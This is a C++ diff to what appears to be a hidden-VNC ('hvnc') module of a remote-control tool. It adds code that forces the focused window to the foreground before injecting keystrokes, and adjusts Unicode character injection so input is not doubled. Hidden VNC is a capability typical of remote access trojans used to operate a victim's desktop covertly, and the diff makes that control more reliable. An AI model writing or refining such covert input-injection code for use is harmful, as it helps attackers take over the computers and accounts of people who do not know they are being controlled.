@@ -918,13 +918,30 @@ static void input_loop() {
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
 
+            // Reinforce focus
+            HWND hFocused = GetFocusedWindow();
+            if (hFocused && IsWindow(hFocused)) {
+                HWND hRoot = GetAncestor(hFocused, GA_ROOT);
+                if (hRoot && GetForegroundWindow() != hRoot) {
+                    SetForegroundWindow(hRoot);
+                    SetFocus(hFocused);
+                }
+            }
+
             bool sendInputOk = false;
             if (action == "hvnc_keydown") {
                 sendInputOk = send_key_input((WORD)vk, true);
             } else if (action == "hvnc_keyup") {
                 sendInputOk = send_key_input((WORD)vk, false);
             } else if (action == "hvnc_char") {
-                sendInputOk = send_unicode_input((WCHAR)vk);
+                // Skip standard character injection to avoid double input,
+                // as send_key_input already triggers the character via wVk.
+                // We only use Unicode for non-ASCII or high-range characters.
+                if (vk > 255) {
+                    sendInputOk = send_unicode_input((WCHAR)vk);
+                } else {
+                    sendInputOk = true;
+                }
             }
 
             if (!sendInputOk) {
